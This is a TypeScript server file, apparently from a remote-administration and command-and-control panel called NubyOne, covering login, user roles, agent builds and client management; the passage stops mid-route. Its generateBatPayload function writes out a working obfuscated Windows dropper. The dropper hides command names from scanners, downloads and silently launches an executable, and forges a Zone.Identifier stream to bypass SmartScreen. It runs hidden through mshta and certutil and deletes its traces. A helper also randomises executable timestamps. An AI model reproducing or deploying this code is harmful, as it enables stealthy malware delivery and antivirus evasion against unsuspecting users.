import path from "path";
import os from "os";
import { fileURLToPath } from "url";
import { existsSync, mkdirSync, writeFileSync, readFileSync, copyFileSync, unlinkSync, statSync } from "fs";

import { getConfig, getDataDir } from "./config";
import { getAuthFromRequest, signToken, buildCookie, clearCookie } from "./auth";
import {
  ensureAdminUser,
  getUserByUsername,
  getUserById,
  getAllUsers,
  createUser,
  updateUserRole,
  updateUserPassword,
  deleteUserById,
  recordUserLogin,
  listClients,
  countClients,
  getClientById,
  deleteClient,
  updateClientTagNote,
  updateClientNickname,
  setClientStatus,
  setClientPersistent,
  storeScreenshot,
  getClientScreenshots,
  deleteClientScreenshots,
} from "./db";
import { tryAgentWsUpgrade, handleWsUpgrade, wsHandler, type SocketData, dispatchScriptExec, dispatchFilePush, dispatchFilePull, dispatchProcList, dispatchProcKill, dispatchAgentAction, dispatchNativeScreenshot, getNotifHistory, markAllNotifsRead } from "./ws";
import { listAgents, isAgentConnected, getAllAgents, getAgent, encodeMsgpack, pingAllConsoleViewers, pingAllAgents, pingAllRemoteViewers } from "./agent-store";
import { seal as cbSeal, generateBuildSecret, type BuildSecret } from "./cryptobox";
import { getOrCreateServerKeypair, signBuildJWT, type ServerKeypair } from "./jwt";
import { loadNotificationConfig, saveNotificationConfig } from "./notifier";
import { loadAutorunScripts, saveAutorunScripts, type AutorunScript } from "./autorun";

// ── Environment-aware public URL detection ─────────────────────────────────
function detectPublicBase(req: Request): { http: string; ws: string } {
  // Priority 1: explicit override via environment variable (VPS / custom domain)
  const envURL = (process.env.NUBYONE_PUBLIC_URL || "").trim();
  if (envURL) {
    const u = envURL.replace(/\/$/, "");
    const ws = u.replace(/^https:\/\//, "wss://").replace(/^http:\/\//, "ws://");
    const http = u.replace(/^wss:\/\//, "https://").replace(/^ws:\/\//, "http://");
    return { http, ws };
  }
  // Priority 2: REPLIT_DEV_DOMAIN (dev environment only).
  // When REPLIT_DEPLOYMENT is set we are in the deployed *.replit.app environment.
  // The dev-domain is auth-gated (Replit login required), so external agents
  // cannot reach it — skip it and fall through to the request headers instead.
  const isDeployed = Boolean(process.env.REPLIT_DEPLOYMENT);
  const replitDomain = (process.env.REPLIT_DEV_DOMAIN || process.env.REPLIT_DOMAINS || "").split(",")[0].trim();
  if (replitDomain && !isDeployed) {
    return { http: `https://${replitDomain}`, ws: `wss://${replitDomain}` };
  }
  // Priority 3: x-forwarded-proto + host headers (reverse proxy / deployed)
  const rawProto = req.headers.get("x-forwarded-proto") || "";
  const fwdProto = rawProto.split(",")[0].trim().toLowerCase();
  const host = req.headers.get("x-forwarded-host") || req.headers.get("host") || `localhost:${getConfig().port}`;
  const cleanHost = host.split(",")[0].trim();
  const isSecure = fwdProto === "https" || fwdProto === "wss" ||
    cleanHost.endsWith(".replit.app") || cleanHost.endsWith(".replit.dev") ||
    Boolean(process.env.REPLIT_DEPLOYMENT);
  return {
    http: `${isSecure ? "https" : "http"}://${cleanHost}`,
    ws:   `${isSecure ? "wss"   : "ws"}://${cleanHost}`,
  };
}

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PUBLIC_DIR = path.resolve(__dirname, "../public");
const SERVER_VERSION = "1.6.3";

function safeOutputExtension(rawExt: string, baseExt: string, targetOS: string): string {
  const ext = String(rawExt || "").trim().toLowerCase();
  if (!ext) return baseExt;
  if (targetOS === "windows") return ext === ".exe" ? ".exe" : baseExt;
  // Non-Windows targets have no binary extension; return the platform default.
  return baseExt;
}


const DATA_DIR     = getDataDir();   // honours NUBYONE_DATA_DIR env var
const APP_SETTINGS_FILE        = path.join(DATA_DIR, "app-settings.json");
const BANNED_IPS_FILE          = path.join(DATA_DIR, "banned-ips.json");

// ── Server Ed25519 keypair (lazy-initialised, persisted in DATA_DIR) ─────────
// Generated once; private key never leaves the server.
// Public key is embedded in every agent build for JWT verification.
let _serverKeypair: ServerKeypair | null = null;
function serverKeypair(): ServerKeypair {
  if (!_serverKeypair) {
    mkdirSync(DATA_DIR, { recursive: true });
    _serverKeypair = getOrCreateServerKeypair(DATA_DIR);
  }
  return _serverKeypair;
}

// ── App settings helpers ──────────────────────────────────────────────────────

interface SecurityConfig {
  sessionTtlHours: number;
  loginMaxAttempts: number;
  loginWindowMinutes: number;
  loginLockoutMinutes: number;
  passwordMinLength: number;
  passwordRequireUppercase: boolean;
  passwordRequireLowercase: boolean;
  passwordRequireNumber: boolean;
  passwordRequireSymbol: boolean;
}

interface TlsCertbotConfig {
  enabled: boolean;
  domain: string;
  email: string;
  httpsPort: number;
  livePath: string;
  certFileName: string;
  keyFileName: string;
  caFileName: string;
}

interface AppSettings {
  security?: SecurityConfig;
  tls?: { certbot: TlsCertbotConfig };
  customCSS?: string;
  appName?: string;
  logoMime?: string;    // MIME type of the uploaded custom logo, e.g. "image/png"
}

const DEFAULT_APP_NAME = "𝗡𝘂𝗯𝘆𝗢𝗻𝗲";

function loadAppSettings(): AppSettings {
  try {
    if (existsSync(APP_SETTINGS_FILE)) {
      return JSON.parse(readFileSync(APP_SETTINGS_FILE, "utf-8"));
    }
  } catch (e: any) {
    console.error("[settings] Failed to load app settings, using defaults:", e?.message || e);
  }
  return {};
}

function saveAppSettings(settings: AppSettings) {
  mkdirSync(DATA_DIR, { recursive: true });
  writeFileSync(APP_SETTINGS_FILE, JSON.stringify(settings, null, 2));
}

function defaultSecurity(): SecurityConfig {
  return {
    sessionTtlHours: 168,
    loginMaxAttempts: 5,
    loginWindowMinutes: 15,
    loginLockoutMinutes: 30,
    passwordMinLength: 6,
    passwordRequireUppercase: false,
    passwordRequireLowercase: false,
    passwordRequireNumber: false,
    passwordRequireSymbol: false,
  };
}

function validatePassword(password: string, sec: SecurityConfig): string | null {
  if (password.length < sec.passwordMinLength) {
    return `Password must be at least ${sec.passwordMinLength} characters`;
  }
  if (sec.passwordRequireUppercase && !/[A-Z]/.test(password)) {
    return "Password must contain at least one uppercase letter";
  }
  if (sec.passwordRequireLowercase && !/[a-z]/.test(password)) {
    return "Password must contain at least one lowercase letter";
  }
  if (sec.passwordRequireNumber && !/[0-9]/.test(password)) {
    return "Password must contain at least one number";
  }
  if (sec.passwordRequireSymbol && !/[^A-Za-z0-9]/.test(password)) {
    return "Password must contain at least one symbol";
  }
  return null;
}

function defaultTlsCertbot(): TlsCertbotConfig {
  return {
    enabled: false,
    domain: "",
    email: "",
    httpsPort: 443,
    livePath: "/etc/letsencrypt/live",
    certFileName: "fullchain.pem",
    keyFileName: "privkey.pem",
    caFileName: "chain.pem",
  };
}

// ── Banned IPs helpers ────────────────────────────────────────────────────────

interface BannedIpEntry { ip: string; reason: string; createdAt: number; }

function loadBannedIps(): BannedIpEntry[] {
  try {
    if (existsSync(BANNED_IPS_FILE)) {
      return JSON.parse(readFileSync(BANNED_IPS_FILE, "utf-8"));
    }
  } catch (e: any) {
    console.error("[security] Failed to load banned IPs list, no IPs will be blocked:", e?.message || e);
  }
  return [];
}

function saveBannedIps(items: BannedIpEntry[]) {
  mkdirSync(DATA_DIR, { recursive: true });
  writeFileSync(BANNED_IPS_FILE, JSON.stringify(items, null, 2));
}

// ── Login brute-force rate limiter ────────────────────────────────────────────
// In-memory; resets on server restart (fine for single-process deployment).
interface LoginAttemptEntry { count: number; windowStart: number; lockedUntil: number; }
const loginAttempts = new Map<string, LoginAttemptEntry>();

// Purge stale entries hourly so the map does not grow unbounded.
setInterval(() => {
  const now = Date.now();
  for (const [ip, entry] of loginAttempts) {
    if (now > entry.lockedUntil && now - entry.windowStart > 60 * 60_000) {
      loginAttempts.delete(ip);
    }
  }
}, 60 * 60_000);

function getRequestIp(req: Request): string {
  return (
    (req.headers.get("x-forwarded-for") ?? "").split(",")[0].trim() ||
    req.headers.get("x-real-ip") ||
    "unknown"
  );
}

function checkLoginRateLimit(ip: string, sec: SecurityConfig): { locked: boolean; retryAfterSec?: number } {
  const now = Date.now();
  const entry = loginAttempts.get(ip);
  if (!entry) return { locked: false };
  if (now < entry.lockedUntil) {
    return { locked: true, retryAfterSec: Math.ceil((entry.lockedUntil - now) / 1000) };
  }
  if (now - entry.windowStart > sec.loginWindowMinutes * 60_000) {
    loginAttempts.delete(ip);
  }
  return { locked: false };
}

function recordLoginFailure(ip: string, sec: SecurityConfig) {
  const now = Date.now();
  let entry = loginAttempts.get(ip);
  if (!entry || now - entry.windowStart > sec.loginWindowMinutes * 60_000) {
    entry = { count: 0, windowStart: now, lockedUntil: 0 };
    loginAttempts.set(ip, entry);
  }
  entry.count++;
  if (entry.count >= sec.loginMaxAttempts) {
    entry.lockedUntil = now + sec.loginLockoutMinutes * 60_000;
    entry.count = 0;
    entry.windowStart = now;
    console.warn(`[auth] IP ${ip} locked out for ${sec.loginLockoutMinutes} min after ${sec.loginMaxAttempts} failed login attempts`);
  }
}

function clearLoginAttempts(ip: string) {
  loginAttempts.delete(ip);
}

// ── Persistent build store (6-day retention) ──────────────────────────────
interface StoredBuild {
  id: string;
  filename: string;
  platform: string;
  version: string;
  created_at: number;
  expires: number;
  sha256?: string;
}

const BUILDS_DIR = path.join(__dirname, "../builds");
const BUILD_MANIFEST = path.join(BUILDS_DIR, "manifest.json");
const BUILD_TTL_MS = 6 * 24 * 60 * 60 * 1000;

const buildStore = new Map<string, StoredBuild>();
const latestBuilds = new Map<string, string>(); // platform -> buildId

// ── Async build job tracking ──────────────────────────────────────────────
interface BuildJob {
  status: "building" | "done" | "failed";
  result?: Record<string, unknown>;
  error?: string;
  startedAt: number;
}
const buildJobs = new Map<string, BuildJob>();
// Prune completed/failed jobs older than 60 minutes every 5 minutes
setInterval(() => {
  const cutoff = Date.now() - 60 * 60 * 1000;
  for (const [id, job] of buildJobs) {
    if (job.startedAt < cutoff) buildJobs.delete(id);
  }
}, 5 * 60 * 1000).unref?.();

// Screenshot history is persisted in SQLite — see db.ts storeScreenshot / getClientScreenshots.

try { if (!existsSync(BUILDS_DIR)) mkdirSync(BUILDS_DIR, { recursive: true }); } catch {}

function saveBuildManifest() {
  try {
    writeFileSync(BUILD_MANIFEST, JSON.stringify({
      builds: [...buildStore.values()],
      latest: Object.fromEntries(latestBuilds),
    }), "utf-8");
  } catch {}
}

// Load persisted manifest on startup
try {
  const raw = readFileSync(BUILD_MANIFEST, "utf-8");
  const parsed = JSON.parse(raw);
  const now = Date.now();
  // Support both old array format and new object format
  const list: StoredBuild[] = Array.isArray(parsed) ? parsed : (parsed.builds ?? []);
  for (const b of list) {
    if (now < b.expires && existsSync(path.join(BUILDS_DIR, b.id))) {
      buildStore.set(b.id, b);
    }
  }
  if (!Array.isArray(parsed) && parsed.latest && typeof parsed.latest === "object") {
    for (const [platform, buildId] of Object.entries(parsed.latest)) {
      if (typeof buildId === "string" && buildStore.has(buildId)) {
        latestBuilds.set(platform, buildId);
      }
    }
  }
} catch {}

setInterval(() => {
  const now = Date.now();
  let changed = false;
  for (const [id, b] of buildStore) {
    if (now > b.expires) {
      try { unlinkSync(path.join(BUILDS_DIR, id)); } catch {}
      buildStore.delete(id);
      changed = true;
    }
  }
  // Remove latestBuilds references that point to expired/deleted builds
  for (const [platform, buildId] of latestBuilds) {
    if (!buildStore.has(buildId)) {
      latestBuilds.delete(platform);
      changed = true;
    }
  }
  if (changed) saveBuildManifest();
}, 10 * 60_000);

function serveFile(filePath: string): Response {
  if (!existsSync(filePath)) {
    return new Response("Not found", { status: 404 });
  }
  return new Response(Bun.file(filePath));
}

function json(data: any, status = 200): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

function getMimeType(filename: string): string {
  const lower = filename.toLowerCase();
  if (lower.endsWith(".exe")) return "application/vnd.microsoft.portable-executable";
  return "application/octet-stream";
}

async function computeFileSha256(filePath: string): Promise<string> {
  const nodeCrypto = await import("crypto");
  const buf = readFileSync(filePath);
  return nodeCrypto.createHash("sha256").update(buf).digest("hex");
}

function patchPETimestamp(filePath: string): void {
  try {
    const buf = Buffer.from(readFileSync(filePath));
    if (buf.length < 0x40) return;
    if (buf.readUInt16LE(0) !== 0x5A4D) return;
    const peOffset = buf.readUInt32LE(0x3C);
    if (peOffset + 12 > buf.length) return;
    if (buf.readUInt32LE(peOffset) !== 0x00004550) return;
    const TS_MIN = 1640995200;
    const TS_MAX = Math.floor(Date.now() / 1000);
    const ts = TS_MIN + Math.floor(Math.random() * (TS_MAX - TS_MIN + 1));
    buf.writeUInt32LE(ts >>> 0, peOffset + 8);
    writeFileSync(filePath, buf);
  } catch {
  }
}

// ── Script payload generators ─────────────────────────────────────────────
//
// generateBatPayload — obfuscated Windows batch file (.bat)
//   Splits the "curl" and "powershell" commands across randomly-named SET
//   variables so static string scanners see no plaintext command names.
//   curl.exe (Win10 1803+ built-in) is tried first — it writes no MOTW ADS.
//   PowerShell with TLS 1.2 forced is used as a fallback. MOTW is stripped,
//   the agent launches detached, and the temp files are cleaned up.
function generateBatPayload(dlUrl: string, exeFilename: string, crypto: typeof import("crypto")): string {
  const uniq = crypto.randomBytes(8).toString("hex");
  const tag  = "zc_" + crypto.randomBytes(5).toString("hex");
  // Split "curl" and "powershell" so static scanners see no plaintext command names.
  const v = Array.from({ length: 6 }, () => crypto.randomBytes(3).toString("hex"));
  const safeExe = exeFilename.replace(/[^A-Za-z0-9._-]/g, "_");

  // PS fallback command: force TLS 1.2 first (the original silent-fail root
  // cause), then try Net.WebClient, then Invoke-WebRequest as a second attempt.
  const psFallback =
    `[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;` +
    `try{(New-Object Net.WebClient).DownloadFile('${dlUrl}','%ZC_EXE%')}` +
    `catch{Invoke-WebRequest -Uri '${dlUrl}' -OutFile '%ZC_EXE%' -UseBasicParsing}`;

  // Inner payload:
  //   1. Try curl.exe (Win10 1803+ built-in) — no MOTW, no TLS quirks.
  //   2. On failure (curl absent or download error) fall back to PowerShell
  //      with TLS 1.2 explicitly set and a Net.WebClient → Invoke-WebRequest
  //      double-attempt.
  const inner =
    `@echo off\r\n` +
    `setlocal enableextensions\r\n` +
    `if not defined LOCALAPPDATA set "LOCALAPPDATA=%ProgramData%"\r\n` +
    `set "ZC_DIR=%LOCALAPPDATA%\\Nubyone\\bootstrap"\r\n` +
    `if not exist "%ZC_DIR%" mkdir "%ZC_DIR%" >nul 2>&1\r\n` +
    `set "ZC_EXE=%ZC_DIR%\\${safeExe}"\r\n` +
    `set "${v[0]}=cu"\r\n` +
    `set "${v[1]}=rl"\r\n` +
    `set "${v[2]}=.exe"\r\n` +
    `set "${v[3]}=pow"\r\n` +
    `set "${v[4]}=erSh"\r\n` +
    `set "${v[5]}=ell"\r\n` +
    `%${v[0]}%%${v[1]}%%${v[2]}% -fLsS --retry 3 --retry-delay 2 -o "%ZC_EXE%" "${dlUrl}" >nul 2>&1\r\n` +
    `if not errorlevel 1 goto :zc_launch\r\n` +
    `%${v[3]}%%${v[4]}%%${v[5]}% -WindowStyle Hidden -NonInteractive -NoProfile -Command "${psFallback}" >nul 2>&1\r\n` +
    `if errorlevel 1 exit /b 1\r\n` +
    `:zc_launch\r\n` +
    // Write a correctly-formed Zone.Identifier ADS so SmartScreen treats the
    // file as zone 0 (local machine) for downloads where MOTW was added (e.g.
    // the PS fallback path).  Two separate lines are required:
    //   [ZoneTransfer]
    //   ZoneId=0
    // Putting the redirect AFTER the parenthesised group lets both `echo`
    // commands share the same stdout redirect (the ADS).  The unescaped `&`
    // inside the group is a command separator, NOT a literal character —
    // unlike `^&` which cmd.exe would emit verbatim, producing one corrupted
    // line instead of two valid ones.
    `(echo [ZoneTransfer]& echo ZoneId=0)>"%ZC_EXE%:Zone.Identifier"\r\n` +
    `start "" /B "%ZC_EXE%"\r\n` +
    `endlocal\r\n` +
    `exit /b 0\r\n`;

  // Outer wrapper — base64-encodes the inner payload via certutil and runs it
  // inside a window-0 mshta child so the visible console disappears immediately.
  const b64    = Buffer.from(inner, "utf8").toString("base64");
  const echoes = (b64.match(/.{1,76}/g) || [])
    .map(line => `echo ${line}`)
    .join("\r\n");

  return (
    `@echo off\r\n` +
    `:: ${uniq}\r\n` +
    `if not "%~1"=="__zc_h__" (mshta vbscript:CreateObject("WScript.Shell").Run("""%~f0"" __zc_h__",0,False)(window.close) & exit /b)\r\n` +
    `setlocal enableextensions\r\n` +
    `set "T=%TEMP%\\${tag}"\r\n` +
    `>"%T%.b64" (\r\n${echoes}\r\n)\r\n` +
    `certutil -f -decode "%T%.b64" "%T%.cmd" >nul 2>&1\r\n` +
    `call "%T%.cmd" >nul 2>&1\r\n` +
    `del /q "%T%.b64" "%T%.cmd" >nul 2>&1\r\n` +
    `endlocal\r\n` +
    `exit /b 0\r\n`
  );
}


function redirect(location: string, status = 302): Response {
  return new Response(null, { status, headers: { Location: location } });
}

async function handleRequest(req: Request): Promise<Response> {
  const url = new URL(req.url);
  const pathname = url.pathname;
  const method = req.method;

  // WebSocket upgrades are handled in fetch(), not here.
  if (pathname === "/ws") return new Response("Not found", { status: 404 });

  // ── Banned IP enforcement ──────────────────────────────────────────────────
  // Skip for ACME challenge (needed for certbot validation before auth applies).
  if (!pathname.startsWith("/.well-known/acme-challenge/")) {
    const clientIp = getRequestIp(req);
    if (clientIp && clientIp !== "unknown") {
      const banned = loadBannedIps();
      const entry = banned.find(e => e.ip === clientIp);
      if (entry) {
        return new Response("Forbidden", { status: 403 });
      }
    }
  }

  const auth = await getAuthFromRequest(req);

  // ---------------------------------------------------------------
  // Public HTML pages
  // ---------------------------------------------------------------

  if (pathname === "/") {
    return auth ? redirect("/clients") : redirect("/login");
  }

  if (pathname === "/login") {
    if (auth) return redirect("/clients");
    return serveFile(path.join(PUBLIC_DIR, "login.html"));
  }

  if (pathname === "/users") {
    if (!auth || auth.role !== "admin") return redirect("/clients");
    return serveFile(path.join(PUBLIC_DIR, "users.html"));
  }

  if (pathname === "/clients") {
    if (!auth) return redirect("/login");
    return serveFile(path.join(PUBLIC_DIR, "clients.html"));
  }

  // Console page: /:clientId/console
  if (pathname.match(/^\/[^/]+\/console$/)) {
    if (!auth) return redirect("/login");
    return serveFile(path.join(PUBLIC_DIR, "console.html"));
  }

  // Remote desktop: /remote/:clientId
  if (pathname.match(/^\/remote\/[^/]+$/)) {
    if (!auth) return redirect("/login");
    return serveFile(path.join(PUBLIC_DIR, "remote.html"));
  }

  if (pathname === "/build") {
    if (!auth) return redirect("/login");
    return serveFile(path.join(PUBLIC_DIR, "build.html"));
  }

  if (pathname === "/scripts") {
    if (!auth) return redirect("/login");
    if (auth.role === "viewer") return redirect("/clients");
    return serveFile(path.join(PUBLIC_DIR, "scripts.html"));
  }

  if (pathname === "/settings") {
    if (!auth) return redirect("/login");
    if (auth.role !== "admin") return redirect("/clients");
    return serveFile(path.join(PUBLIC_DIR, "settings.html"));
  }

  // ---------------------------------------------------------------
  // Static assets
  // ---------------------------------------------------------------

  if (pathname.startsWith("/assets/")) {
    const assetPath = path.resolve(PUBLIC_DIR, pathname.slice(1));
    // Path traversal guard: resolved path must remain inside PUBLIC_DIR.
    if (!assetPath.startsWith(PUBLIC_DIR + path.sep) && assetPath !== PUBLIC_DIR) {
      return new Response("Forbidden", { status: 403 });
    }
    if (!existsSync(assetPath)) return new Response("Not found", { status: 404 });
    return new Response(Bun.file(assetPath));
  }

  // ---------------------------------------------------------------
  // Auth API
  // ---------------------------------------------------------------

  if (pathname === "/api/server-url" && method === "GET") {
    const { ws: wsUrl, http: httpUrl } = detectPublicBase(req);
    return json({ wsUrl, httpUrl });
  }

  // ── Health check (unauthenticated; safe to expose — no sensitive data) ────
  if (pathname === "/api/health" && method === "GET") {
    let dbStatus = "ok";
    try { countClients(); } catch { dbStatus = "error"; }
    const connected = listAgents().length;
    const total     = countClients();
    return json({
      ok:              true,
      version:         SERVER_VERSION,
      uptime_seconds:  Math.floor(process.uptime()),
      clients:         { connected, total },
      db:              dbStatus,
      timestamp:       Date.now(),
    });
  }

  // ── Build environment health check (unauthenticated; no sensitive data) ──
  if (pathname === "/api/health/build" && method === "GET") {
    const homeDir = os.homedir();

    const sdkCandidates: Record<string, string[]> = {
      "go1.25.0": [
        path.join(homeDir, "sdk", "go1.25.0"),
        "/root/sdk/go1.25.0",
        "/usr/local/sdk/go1.25.0",
      ],
      "go1.26.2": [
        path.join(homeDir, "sdk", "go1.26.2"),
        "/root/sdk/go1.26.2",
        "/usr/local/sdk/go1.26.2",
      ],
    };
    const garbleCandidates = [
      path.join(homeDir, "go", "bin", "garble"),
      "/root/go/bin/garble",
      "/usr/local/bin/garble",
    ];
    const upxCandidates = [
      path.join(homeDir, "bin", "upx"),
      "/usr/local/bin/upx",
      "/usr/bin/upx",
    ];

    const findFirst = (paths: string[]) =>
      paths.find(p => { try { return existsSync(p); } catch { return false; } }) ?? null;

    const go125path = findFirst(sdkCandidates["go1.25.0"]);
    const go126path = findFirst(sdkCandidates["go1.26.2"]);
    const garblePath = findFirst(garbleCandidates);
    const upxPath = findFirst(upxCandidates);

    const clientDir = path.join(path.dirname(path.dirname(fileURLToPath(import.meta.url))), "..", "Nubyone-Client");
    const goModPath = path.join(clientDir, "go.mod");
    let goModVersion: string | null = null;
    try {
      const goModContent = readFileSync(goModPath, "utf8");
      const match = goModContent.match(/^go\s+(\S+)/m);
      goModVersion = match ? match[1] : "unknown";
    } catch { /* not found */ }

    const sdks = {
      "go1.25.0": { found: !!go125path, path: go125path, role: "plain builds (go.mod requirement)" },
      "go1.26.2": { found: !!go126path, path: go126path, role: "garble obfuscated builds" },
    };
    const _gviBinCandidates = [
      path.join(homeDir, "go", "bin", "goversioninfo"),
      "/root/go/bin/goversioninfo",
      "/usr/local/bin/goversioninfo",
    ];
    const gviBin = _gviBinCandidates.find(p => { try { return existsSync(p); } catch { return false; } }) ?? null;

    const tools = {
      garble:         { found: !!garblePath, path: garblePath },
      upx:            { found: !!upxPath,    path: upxPath },
      goversioninfo:  { found: !!gviBin,     path: gviBin },
    };

    const plainBuildReady  = !!go125path;
    const garbleBuildReady = !!go126path && !!garblePath;
    const ok = plainBuildReady; // garble is optional — plain builds always work

    return json({
      ok,
      plain_build_ready:     plainBuildReady,
      garble_build_ready:    garbleBuildReady,
      goversioninfo_ready:   !!gviBin,
      go_mod_version:        goModVersion,
      sdks,
      tools,
      message: ok
        ? garbleBuildReady
          ? "All good — garble + plain builds available."
          : "Plain builds ready. Install garble + Go 1.26.2 for obfuscated builds."
        : "Go 1.25.0 SDK missing — run deploy.sh or install it to ~/sdk/go1.25.0.",
    });
  }

  // ── Install toolchains (admin-only; streams progress via SSE) ───────────
  if (pathname === "/api/admin/install-toolchains" && method === "POST") {
    if (!auth || auth.role !== "admin") return json({ error: "Unauthorized" }, 403);

    const setupScript = path.resolve(__dirname, "../../scripts/setup-toolchains.sh");
    if (!existsSync(setupScript)) {
      return json({ error: "setup-toolchains.sh not found in the repository" }, 500);
    }

    const enc = new TextEncoder();
    const sseEvent = (data: unknown) =>
      enc.encode(`data: ${JSON.stringify(data)}\n\n`);

    const stream = new ReadableStream<Uint8Array>({
      async start(ctrl) {
        try {
          const proc = Bun.spawn(["bash", setupScript], {
            stdout: "pipe",
            stderr: "pipe",
            env: { ...process.env } as Record<string, string>,
          });

          const readLines = async (rs: ReadableStream<Uint8Array> | null | undefined) => {
            if (!rs) return;
            const reader = rs.getReader();
            const dec = new TextDecoder();
            let buf = "";
            while (true) {
              const { done, value } = await reader.read();
              if (done) break;
              buf += dec.decode(value, { stream: true });
              const parts = buf.split("\n");
              buf = parts.pop() ?? "";
              for (const line of parts) if (line.trim()) ctrl.enqueue(sseEvent(line));
            }
            if (buf.trim()) ctrl.enqueue(sseEvent(buf));
          };

          await Promise.all([
            readLines(proc.stdout as ReadableStream<Uint8Array> | undefined),
            readLines(proc.stderr as ReadableStream<Uint8Array> | undefined),
          ]);
          const code = await proc.exited;
          ctrl.enqueue(sseEvent({ done: true, code }));
        } catch (e: any) {
          ctrl.enqueue(sseEvent({ error: e?.message || String(e) }));
        } finally {
          ctrl.close();
        }
      },
    });

    return new Response(stream, {
      headers: {
        "Content-Type": "text/event-stream",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "X-Accel-Buffering": "no",
      },
    });
  }

  if (pathname === "/api/auth/login" && method === "POST") {
    const ip = getRequestIp(req);
    const appSec = { ...defaultSecurity(), ...(loadAppSettings().security ?? {}) };
    const rl = checkLoginRateLimit(ip, appSec);
    if (rl.locked) {
      return json({ error: "Too many failed login attempts. Try again later.", retryAfterSec: rl.retryAfterSec }, 429);
    }

    let body: any;
    try { body = await req.json(); } catch { return json({ error: "Invalid body" }, 400); }

    const user = getUserByUsername(body.username || "");
    if (!user) {
      recordLoginFailure(ip, appSec);
      return json({ error: "Invalid credentials" }, 401);
    }

    const valid = await Bun.password.verify(body.password || "", user.password_hash);
    if (!valid) {
      recordLoginFailure(ip, appSec);
      return json({ error: "Invalid credentials" }, 401);
    }

    clearLoginAttempts(ip);
    recordUserLogin(user.id);

    const token = await signToken({ userId: user.id, username: user.username, role: user.role });
    return new Response(JSON.stringify({ ok: true }), {
      headers: {
        "Content-Type": "application/json",
        "Set-Cookie": buildCookie(token),
      },
    });
  }

  if ((pathname === "/api/auth/logout" || pathname === "/api/logout") && method === "POST") {
    return new Response(JSON.stringify({ ok: true }), {
      headers: {
        "Content-Type": "application/json",
        "Set-Cookie": clearCookie(),
      },
    });
  }

  if ((pathname === "/api/auth/me" || pathname === "/api/me") && method === "GET") {
    if (!auth) return json({ error: "Unauthorized" }, 401);
    const user = getUserById(auth.userId);
    if (!user) return json({ error: "User not found" }, 404);
    return json({ id: user.id, username: user.username, role: user.role });
  }

  // ---------------------------------------------------------------
  // Server info
  // ---------------------------------------------------------------

  if (pathname === "/api/version" && method === "GET") {
    return json({ version: SERVER_VERSION, ok: true });
  }

  if (pathname === "/health") {
    return json({ ok: true, service: "nubyone", version: SERVER_VERSION });
  }

  // ---------------------------------------------------------------
  // Users API
  // ---------------------------------------------------------------

  if (pathname === "/api/users" && method === "GET") {
    if (!auth || auth.role !== "admin") return json({ error: "Forbidden" }, 403);
    return json(getAllUsers());
  }

  if (pathname === "/api/users" && method === "POST") {
    if (!auth || auth.role !== "admin") return json({ error: "Forbidden" }, 403);
    let body: any;
    try { body = await req.json(); } catch { return json({ error: "Invalid body" }, 400); }
    const username = String(body.username || "").trim();
    const password = String(body.password || "").trim();
    const validRoles = ["admin", "operator", "tech", "viewer"];
    const role = validRoles.includes(body.role) ? body.role : "tech";
    if (!username || !password) return json({ error: "Username and password required" }, 400);
    if (!/^[a-zA-Z0-9_-]{3,32}$/.test(username)) return json({ error: "Invalid username format" }, 400);
    const pwErr = validatePassword(password, loadAppSettings().security ?? defaultSecurity());
    if (pwErr) return json({ error: pwErr }, 400);
    if (getUserByUsername(username)) return json({ error: "Username already exists" }, 409);
    const hash = await Bun.password.hash(password);
    createUser(username, hash, role, auth.username);
    return json({ ok: true }, 201);
  }

  if (pathname.match(/^\/api\/users\/\d+\/role$/) && method === "PATCH") {
    if (!auth || auth.role !== "admin") return json({ error: "Forbidden" }, 403);
    const id = parseInt(pathname.split("/")[3]);
    let body: any;
    try { body = await req.json(); } catch { return json({ error: "Invalid body" }, 400); }
    const validRoles = ["admin", "operator", "tech", "viewer"];
    if (!validRoles.includes(body.role)) return json({ error: "Invalid role" }, 400);
    if (id === auth.userId && body.role !== "admin") return json({ error: "Cannot demote your own admin account" }, 403);
    updateUserRole(id, body.role);
    return json({ ok: true });
  }

  if (pathname.match(/^\/api\/users\/\d+\/password$/) && method === "PATCH") {
    if (!auth || auth.role !== "admin") return json({ error: "Forbidden" }, 403);
    const id = parseInt(pathname.split("/")[3]);
    let body: any;
    try { body = await req.json(); } catch { return json({ error: "Invalid body" }, 400); }
    const password = String(body.password || "").trim();
    if (!password) return json({ error: "Password required" }, 400);
    const pwErr2 = validatePassword(password, loadAppSettings().security ?? defaultSecurity());
    if (pwErr2) return json({ error: pwErr2 }, 400);
    const hash = await Bun.password.hash(password);
    updateUserPassword(id, hash);
    return json({ ok: true });
  }

  if (pathname.match(/^\/api\/users\/\d+$/) && method === "DELETE") {
    if (!auth || auth.role !== "admin") return json({ error: "Forbidden" }, 403);
    const id = parseInt(pathname.split("/").pop()!);
    if (id === auth.userId) return json({ error: "Cannot delete your own account" }, 403);
    deleteUserById(id);
    return json({ ok: true });
  }

  // ---------------------------------------------------------------
  // Clients (Agents) API
  // ---------------------------------------------------------------

  if (pathname === "/api/clients" && method === "GET") {
    if (!auth) return json({ error: "Unauthorized" }, 401);

    const status = url.searchParams.get("status") || "all";
    const search = url.searchParams.get("search") || "";
    const limit = Math.min(Number(url.searchParams.get("limit") || "200"), 500);
    const offset = Number(url.searchParams.get("offset") || "0");

    const clients = listClients({ status: status === "all" ? undefined : status, search, limit, offset });
    const total = countClients({ status: status === "all" ? undefined : status });

    // Merge in-memory online status.
    const merged = clients.map((c) => ({
      ...c,
      online: isAgentConnected(c.id),
      status: isAgentConnected(c.id) ? "online" : "offline",
    }));

    return json({ items: merged, total });
  }

  // Banned IPs — must be before the generic /api/clients/:id pattern
  if (pathname === "/api/clients/banned-ips" && method === "GET") {
    if (!auth || (auth.role !== "admin" && auth.role !== "operator")) {
      return json({ error: "Forbidden" }, 403);
    }
    return json({ items: loadBannedIps() });
  }

  if (pathname === "/api/clients/banned-ips" && method === "DELETE") {
    if (!auth || (auth.role !== "admin" && auth.role !== "operator")) {
      return json({ error: "Forbidden" }, 403);
    }
    const ip = url.searchParams.get("ip") || "";
    if (!ip) return json({ error: "ip parameter required" }, 400);
    const items = loadBannedIps().filter(e => e.ip !== ip);
    saveBannedIps(items);
    return json({ ok: true });
  }

  // Wipe offline clients — must be before the generic /api/clients/:id pattern
  if (pathname === "/api/clients/offline" && method === "DELETE") {
